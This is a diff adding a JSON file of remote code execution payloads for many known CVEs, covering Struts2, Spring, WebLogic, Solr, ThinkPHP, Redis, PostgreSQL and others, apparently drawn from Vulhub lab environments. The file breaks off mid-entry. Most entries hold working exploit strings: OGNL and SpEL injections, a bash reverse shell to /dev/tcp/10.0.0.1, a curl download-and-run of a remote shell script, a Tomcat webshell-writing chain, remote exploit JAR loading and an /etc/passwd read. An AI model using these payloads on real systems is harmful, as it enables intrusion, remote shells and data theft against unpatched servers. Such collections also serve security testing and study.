@@ -1,0 +1,2811 @@
+{
+  "rce": [
+    {
+      "app": "zabbix",
+      "target": "CVE-2017-2824",
+      "description": "Zabbix server-side trapper command injection vulnerability allows remote code execution via crafted data packets from a proxy, exploiting automatic registration to inject commands.",
+      "payloads": [
+        "{\"request\":\"active checks\",\"host\":\"vulhub\",\"ip\":\";touch /tmp/success\"}",
+        "{\"request\":\"command\",\"scriptid\":1,\"hostid\":\"<hostid>\"}"
+      ]
+    },
+    {
+      "app": "zabbix",
+      "target": "CVE-2020-11800",
+      "description": "The vulnerability is a command injection in Zabbix Server's Active Proxy Trapper due to an incomplete patch for CVE-2017-2824, allowing bypass via IPv6 input to execute arbitrary commands.",
+      "payloads": [
+        "ffff:::;touch /tmp/success2"
+      ]
+    },
+    {
+      "app": "yapi",
+      "target": "mongodb-inj",
+      "description": "NoSQL injection in YApi versions before 1.12.0 allows attackers to steal project tokens and execute arbitrary mock scripts, leading to remote command execution.",
+      "payloads": [
+        "poc.py --debug one4all -u http://127.0.0.1:3000/"
+      ]
+    },
+    {
+      "app": "yapi",
+      "target": "unacc",
+      "description": "YApi's open registration allows attackers to use the Mock feature to execute arbitrary code via JavaScript injection in the Mock script.",
+      "payloads": [
+        "const sandbox = this\nconst ObjectConstructor = this.constructor\nconst FunctionConstructor = ObjectConstructor.constructor\nconst myfun = FunctionConstructor('return process')\nconst process = myfun()\nmockJson = process.mainModule.require(\"child_process\").execSync(\"id;uname -a;pwd\").toString()"
+      ]
+    },
+    {
+      "app": "xxl-job",
+      "target": "unacc",
+      "description": "XXL-JOB executor lacks authentication, allowing unauthenticated attackers to execute arbitrary commands via RESTful API requests.",
+      "payloads": [
+        "POST /run HTTP/1.1",
+        "Content-Type: application/json",
+        "{\"jobId\": 1, \"executorHandler\": \"demoJobHandler\", \"executorParams\": \"demoJobHandler\", \"executorBlockStrategy\": \"COVER_EARLY\", \"executorTimeout\": 0, \"logId\": 1, \"logDateTime\": 1586629003729, \"glueType\": \"GLUE_SHELL\", \"glueSource\": \"touch /tmp/success\", \"glueUpdatetime\": 1586699003758, \"broadcastIndex\": 0, \"broadcastTotal\": 0}"
+      ]
+    },
+    {
+      "app": "wordpress",
+      "target": "pwnscriptum",
+      "description": "WordPress 4.6 vulnerability allows remote command execution via crafted Host header in password reset request, exploiting PHPMailer to run arbitrary commands.",
+      "payloads": [
+        "POST /wp-login.php?action=lostpassword HTTP/1.1\nHost: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)",
+        "wp-submit=Get+New+Password&redirect_to=&user_login=admin",
+        "${substr{0}{1}{$spool_directory}}",
+        "${substr{10}{1}{$tod_log}}",
+        "/usr/bin/curl -o/tmp/rce example.com/shell.sh",
+        "/bin/bash /tmp/rce"
+      ]
+    },
+    {
+      "app": "webmin",
+      "target": "CVE-2019-15107",
+      "description": "Unauthenticated remote command execution via command injection in the password change page when a non-existent user is specified.",
+      "payloads": [
+        "POST /password_change.cgi HTTP/1.1\nHost: your-ip:10000\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nCookie: redirect=1; testing=1; sid=x; sessiontest=1\nReferer: https://your-ip:10000/session_login.cgi\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 60\n\nuser=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2"
+      ]
+    },
+    {
+      "app": "weblogic",
+      "target": "CVE-2020-14882",
+      "description": "Unauthorized access to Weblogic admin console via path traversal (CVE-2020-14882) combined with remote code execution through deserialization or XML injection (CVE-2020-14883) allows executing arbitrary commands via a single GET request.",
+      "payloads": [
+        "/console/css/%252e%252e%252fconsole.portal",
+        "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');\")",
+        "http://example.com/rce.xml (XML payload for ProcessBuilder)"
+      ]
+    },
+    {
+      "app": "weblogic",
+      "target": "CVE-2023-21839",
+      "description": "Unauthenticated remote code execution via JNDI lookup over T3/IIOP protocols, exploiting deserialization gadgets in low JDK versions or available javaSerializedData.",
+      "payloads": [
+        "T3 protocol",
+        "IIOP protocol",
+        "JNDI lookup",
+        "ldap://craft.ldap.tld/test"
+      ]
+    },
+    {
+      "app": "uwsgi",
+      "target": "unacc",
+      "description": "uWSGI allows unauthorized access via exposed ports, enabling attackers to construct uwsgi packets with the magic variable UWSGI_FILE using the exec:// protocol to execute arbitrary commands.",
+      "payloads": [
+        "UWSGI_FILE",
+        "exec:// protocol"
+      ]
+    },
+    {
+      "app": "thinkphp",
+      "target": "2-rce",
+      "description": "ThinkPHP 2.x uses preg_replace with /e mode in routing, allowing user input to be executed as PHP code, leading to remote code execution.",
+      "payloads": [
+        "http://your-ip:8080/index.php?s=/index/index/name/${@phpinfo()}"
+      ]
+    },
+    {
+      "app": "thinkphp",
+      "target": "5-rce",
+      "description": "ThinkPHP 5.0.22/5.1.29 has a remote code execution vulnerability due to improper handling of controller names, allowing arbitrary method execution when forced routing is not enabled.",
+      "payloads": [
+        "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
+      ]
+    },
+    {
+      "app": "thinkphp",
+      "target": "5.0.23-rce",
+      "description": "In ThinkPHP 5.0.23 and earlier, improper handling of method names in the Request class allows attackers to call arbitrary methods and construct an exploit chain, leading to remote code execution.",
+      "payloads": [
+        "POST /index.php?s=captcha HTTP/1.1",
+        "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"
+      ]
+    },
+    {
+      "app": "teamcity",
+      "target": "CVE-2023-42793",
+      "description": "An authentication bypass vulnerability in JetBrains TeamCity allows unauthenticated attackers to create API tokens and enable debug mode, leading to remote command execution.",
+      "payloads": [
+        "POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1",
+        "POST /admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true HTTP/1.1",
+        "POST /app/rest/debug/processes?exePath=id HTTP/1.1"
+      ]
+    },
+    {
+      "app": "supervisor",
+      "target": "CVE-2017-11610",
+      "description": "Supervisord versions before 3.0.1, 3.1.4, 3.2.4, and 3.3.3 have a remote code execution vulnerability in the XML-RPC interface, allowing attackers to execute arbitrary commands via crafted XML-RPC requests.",
+      "payloads": [
+        "<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>\n<params>\n<param>\n<string>touch /tmp/success</string>\n</param>\n</params>\n</methodCall>",
+        "supervisor.supervisord.options.warnings.linecache.os.system",
+        "supervisor.readLog",
+        "supervisor.supervisord.options.logfile.strip"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-001",
+      "description": "The vulnerability occurs when user-submitted form data fails validation, and the backend uses OGNL expressions %{value} to parse and refill the data, allowing remote code execution via crafted payloads.",
+      "payloads": [
+        "%{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"}",
+        "%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}",
+        "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"pwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-005",
+      "description": "The vulnerability exploits OGNL expression injection in Struts2 parameters to bypass security restrictions and execute arbitrary Java code, leading to remote command execution.",
+      "payloads": [
+        "GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1",
+        "POST /example/HelloWorld.action HTTP/1.1"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-007",
+      "description": "A remote code execution vulnerability in Struts2 where type validation errors cause user input to be concatenated and evaluated as OGNL expressions, allowing arbitrary code execution.",
+      "payloads": [
+        "' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@java.lang.Runtime@getRuntime().exec(\"open /Applications/Calculator.app\")) + '",
+        "' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-008",
+      "description": "The vulnerability allows remote code execution via OGNL expression injection in devMode, enabling command execution through crafted parameters.",
+      "payloads": [
+        "?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-009",
+      "description": "The vulnerability allows remote code execution by injecting OGNL expressions into a parameter and exploiting Struts2's handling of special characters to bypass security restrictions.",
+      "payloads": [
+        "/helloword.acton?example=<OGNL statement>&(example)('xxx')=1",
+        "http://your-ip:8080/ajax/example5.action"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-012",
+      "description": "The vulnerability occurs when a redirect result in Struts2 uses ${param_name} with OGNL expression evaluation, allowing arbitrary OGNL code injection and remote command execution.",
+      "payloads": [
+        "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"cat\", \"/etc/passwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-015",
+      "description": "Vulnerability arises from wildcard action configurations in Struts2 that parse user input as OGNL expressions, leading to remote code execution. It also involves secondary execution through parameter references in configuration files.",
+      "payloads": [
+        "${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}",
+        "%{1111*2}",
+        "#_memberAccess['allowStaticMethodAccess']=true",
+        "(new java.lang.ProcessBuilder('calc')).start()"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-032",
+      "description": "Struts2 vulnerability where dynamic method invocation allows OGNL expression evaluation in method names, leading to remote code execution.",
+      "payloads": [
+        "http://your-ip:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-045",
+      "description": "A remote code execution vulnerability in Apache Struts2 due to improper handling of Content-Type header in multipart requests, allowing attackers to inject OGNL expressions.",
+      "payloads": [
+        "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-048",
+      "description": "The vulnerability is a remote code execution flaw in Struts2 due to improper handling of OGNL expressions in the 'Gangster Name' form field, allowing attackers to inject and execute arbitrary commands.",
+      "payloads": [
+        "${233*233}",
+        "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}",
+        "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-053",
+      "description": "Struts2 with Freemarker template engine allows double OGNL expression parsing, leading to remote code execution when user input is processed.",
+      "payloads": [
+        "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-057",
+      "description": "The vulnerability allows remote command execution via OGNL expression injection in the namespace parameter when specific Struts2 configurations are met.",
+      "payloads": [
+        "${233*233}",
+        "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-059",
+      "description": "Apache Struts2 improperly evaluates OGNL expressions in tag attributes, allowing attackers to inject and execute arbitrary code via crafted payloads.",
+      "payloads": [
+        "%25%7B233*233%7D",
+        "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}",
+        "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))}"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-061",
+      "description": "S2-061 is a bypass of the OGNL expression sandbox fix for S2-059, allowing remote command execution in Struts2 versions 2.0.0 to 2.5.25.",
+      "payloads": [
+        "%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"id\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}"
+      ]
+    },
+    {
+      "app": "spring",
+      "target": "CVE-2016-4977",
+      "description": "Spring Security OAuth2 whitelabel views use SpEL expressions that can be exploited via malicious parameters to execute arbitrary commands remotely when authorized.",
+      "payloads": [
+        "${233*233}",
+        "http://your-ip:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test"
+      ]
+    },
+    {
+      "app": "spring",
+      "target": "CVE-2017-4971",
+      "description": "Spring WebFlow 2.4.x has a SpEL expression injection vulnerability when controlling data binding fields, leading to arbitrary command execution.",
+      "payloads": [
+        "_(new java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash -i >& /dev/tcp/10.0.0.1/21 0>&1\")).start()=vulhub"
+      ]
+    },
+    {
+      "app": "spring",
+      "target": "CVE-2017-8046",
+      "description": "The vulnerability allows remote code execution via SpEL expression injection in the path parameter of PATCH requests in Spring Data REST, due to improper handling of user input in the setValue method.",
+      "payloads": [
+        "[{ \"op\": \"replace\", \"path\": \"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname\", \"value\": \"vulhub\" }]"
+      ]
+    },
+    {
+      "app": "spring",
+      "target": "CVE-2018-1270",
+      "description": "Spring Messaging allows clients to subscribe with SpEL expressions in selectors, which are evaluated using StandardEvaluationContext, leading to remote command execution.",
+      "payloads": [
+        "/topic/greetings",
+        "/app/hello",
+        "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')"
+      ]
+    },
+    {
+      "app": "spring",
+      "target": "CVE-2018-1273",
+      "description": "Spring Data Commons has a SpEL expression injection vulnerability in versions up to 2.0.5, allowing attackers to execute arbitrary commands via malicious payloads in user input.",
+      "payloads": [
+        "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"touch /tmp/success\")]=&password=&repeatedPassword="
+      ]
+    },
+    {
+      "app": "spring",
+      "target": "CVE-2022-22947",
+      "description": "Spring Cloud Gateway versions 3.1.0 and 3.0.6 (and earlier) have a SpEL expression injection vulnerability in the Actuator API, allowing attackers to execute arbitrary commands when they can access the API.",
+      "payloads": [
+        "POST /actuator/gateway/routes/hacktest HTTP/1.1 with JSON body containing SpEL expression in the 'value' field of 'args'",
+        "POST /actuator/gateway/refresh HTTP/1.1",
+        "GET /actuator/gateway/routes/hacktest HTTP/1.1"
+      ]
+    },
+    {
+      "app": "spring",
+      "target": "CVE-2022-22963",
+      "description": "Spring Cloud Function is vulnerable to remote code execution via SpEL expression injection in the 'spring.cloud.function.routing-expression' HTTP header.",
+      "payloads": [
+        "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/success\")"
+      ]
+    },
+    {
+      "app": "spring",
+      "target": "CVE-2022-22965",
+      "description": "A remote code execution vulnerability in Spring MVC or WebFlux applications running on JDK 9+ due to data binding issues, allowing attackers to modify Tomcat logging configuration to write a JSP webshell.",
+      "payloads": [
+        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+        "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+        "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+        "suffix: %>//",
+        "c1: Runtime",
+        "c2: <%",
+        "http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=id",
+        "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
+      ]
+    },
+    {
+      "app": "spark",
+      "target": "unacc",
+      "description": "Unauthenticated access to Apache Spark management nodes allows submitting malicious applications via REST API or submissions gateway, leading to remote code execution.",
+      "payloads": [
+        "POST /v1/submissions/create HTTP/1.1",
+        "{\"action\": \"CreateSubmissionRequest\", \"clientSparkVersion\": \"2.3.1\", \"appArgs\": [\"id\"], \"appResource\": \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\", \"environmentVariables\": {\"SPARK_ENV_LOADED\": \"1\"}, \"mainClass\": \"Exploit\", \"sparkProperties\": {\"spark.jars\": \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\", \"spark.driver.supervise\": \"false\", \"spark.app.name\": \"Exploit\", \"spark.eventLog.enabled\": \"true\", \"spark.submit.deployMode\": \"cluster\", \"spark.master\": \"spark://your-ip:7077\"}}"
+      ]
+    },
+    {
+      "app": "solr",
+      "target": "CVE-2017-12629-RCE",
+      "description": "Apache Solr 7.1.0之前版本存在远程命令执行漏洞，通过添加恶意listener并触发update操作来执行任意命令。",
+      "payloads": [
+        "POST /solr/demo/config HTTP/1.1\nHost: your-ip\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Length: 158\n\n{\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newlistener\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\", \"touch /tmp/success\"]}}",
+        "POST /solr/demo/update HTTP/1.1\nHost: your-ip\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/json\nContent-Length: 15\n\n[{\"id\":\"test\"}]"
+      ]
+    },
+    {
+      "app": "solr",
+      "target": "CVE-2019-0193",
+      "description": "The vulnerability is in Apache Solr's DataImportHandler, where an attacker can inject malicious scripts via the dataConfig parameter in external requests, leading to remote command execution.",
+      "payloads": [
+        "<dataConfig><script><![CDATA[function poc(){ java.lang.Runtime.getRuntime().exec(\"touch /tmp/success\"); }]]></script><document><entity name=\"sample\" fileName=\".*\" baseDir=\"/\" processor=\"FileListEntityProcessor\" recursive=\"false\" transformer=\"script:poc\" /></document></dataConfig>",
+        "POST /solr/demo/dataimport?_=1708782956647&indent=on&wt=json HTTP/1.1",
+        "command=full-import&verbose=false&clean=false&commit=true&debug=true&core=demo&dataConfig=%3CdataConfig%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22sample%22%0A++++++++++++fileName%3D%22.*%22%0A++++++++++++baseDir%3D%22%2F%22%0A++++++++++++processor%3D%22FileListEnti"
+      ]
+    },
+    {
+      "app": "solr",
+      "target": "CVE-2019-17558",
+      "description": "Apache Solr versions 5.0.0 to 8.3.1 are vulnerable to remote code execution via Velocity template injection, where malicious templates can be executed by enabling params.resource.loader.enabled in the configuration.",
+      "payloads": [
+        "POST /solr/demo/config HTTP/1.1\nHost: solr:8983\nContent-Type: application/json\nContent-Length: 259\n\n{\n  \"update-queryresponsewriter\": {\n    \"startup\": \"lazy\",\n    \"name\": \"velocity\",\n    \"class\": \"solr.VelocityResponseWriter\",\n    \"template.base.dir\": \"\",\n    \"solr.resource.loader.enabled\": \"true\",\n    \"params.resource.loader.enabled\": \"true\"\n  }\n}",
+        "http://your-ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
+      ]
+    },
+    {
+      "app": "samba",
+      "target": "CVE-2017-7494",
+      "description": "Samba allows connecting to a remote named pipe and loads a dynamic library based on the pipe name without proper validation, enabling attackers to upload a malicious library and execute arbitrary code.",
+      "payloads": [
+        "libbindshell-samba.so",
+        "/home/share/libbindshell-samba.so",
+        "exploit.py -t your-ip -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699"
+      ]
+    },
+    {
+      "app": "saltstack",
+      "target": "CVE-2020-16846",
+      "description": "The vulnerability allows unauthenticated attackers to execute arbitrary commands via command injection in the ssh_priv parameter of the SaltStack API.",
+      "payloads": [
+        "token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|touch%20/tmp/success%3b"
+      ]
+    },
+    {
+      "app": "ruby",
+      "target": "CVE-2017-17405",
+      "description": "Ruby Net::FTP module uses the open function without sanitizing shell characters in filenames, allowing command injection when user-controlled filenames are processed during FTP upload/download operations.",
+      "payloads": [
+        "|touch${IFS}success.txt",
+        "|bash${IFS}-c${IFS}'{echo,YmFzaCAtaSA...}|{base64,-d}|{bash,-i}'"
+      ]
+    },
+    {
+      "app": "rocketmq",
+      "target": "CVE-2023-33246",
+      "description": "Apache RocketMQ Broker 5.1.0 and earlier has a remote command execution vulnerability due to lack of authentication and input validation in the configuration update interface, allowing attackers to inject commands via the rocketmqHome configuration value in the filter server mechanism.",
+      "payloads": [
+        "AttackBroker --target your-ip:10911 --cmd \"touch /tmp/success\""
+      ]
+    },
+    {
+      "app": "redis",
+      "target": "4-unacc",
+      "description": "Redis 4.x/5.x versions before 5.0.5 allow unauthorized access and command execution via master/slave replication, enabling loading of remote modules through dynamic linking to run arbitrary commands.",
+      "payloads": [
+        "master/slave mode",
+        "dynamic linking library",
+        "POC from https://github.com/vulhub/redis-rogue-getshell"
+      ]
+    },
+    {
+      "app": "redis",
+      "target": "CVE-2022-0543",
+      "description": "Redis Lua sandbox escape due to leftover 'package' object in Debian/Ubuntu packages, allowing loading of liblua functions to execute arbitrary commands.",
+      "payloads": [
+        "eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0"
+      ]
+    },
+    {
+      "app": "python",
+      "target": "PIL-CVE-2017-8291",
+      "description": "Python PIL (Pillow) library is vulnerable to remote command execution due to a GhostScript sandbox bypass (CVE-2017-8291) when processing EPS files, as it internally calls the gs command without proper security.",
+      "payloads": [
+        "%!PS",
+        "EPS file with PNG extension"
+      ]
+    },
+    {
+      "app": "python",
+      "target": "PIL-CVE-2018-16509",
+      "description": "A vulnerability in Ghostscript versions before 9.24 allows bypassing the -dSAFER sandbox via a malicious EPS file, leading to remote command execution when processed by PIL/Pillow in Python applications.",
+      "payloads": [
+        "%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: -0 -0 100 100\n\nuserdict /setpagedevice undef\nsave\nlegal\n{ null restore } stopped { pop } if\n{ legal } stopped { pop } if\nrestore\nmark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops"
+      ]
+    },
+    {
+      "app": "postgres",
+      "target": "CVE-2019-9193",
+      "description": "PostgreSQL 9.3 to 11 allows users with 'COPY TO/FROM PROGRAM' privileges to execute arbitrary system commands via the PROGRAM clause.",
+      "payloads": [
+        "DROP TABLE IF EXISTS cmd_exec;",
+        "CREATE TABLE cmd_exec(cmd_output text);",
+        "COPY cmd_exec FROM PROGRAM 'id';",
+        "SELECT * FROM cmd_exec;"
+      ]
+    },
+    {
+      "app": "phpunit",
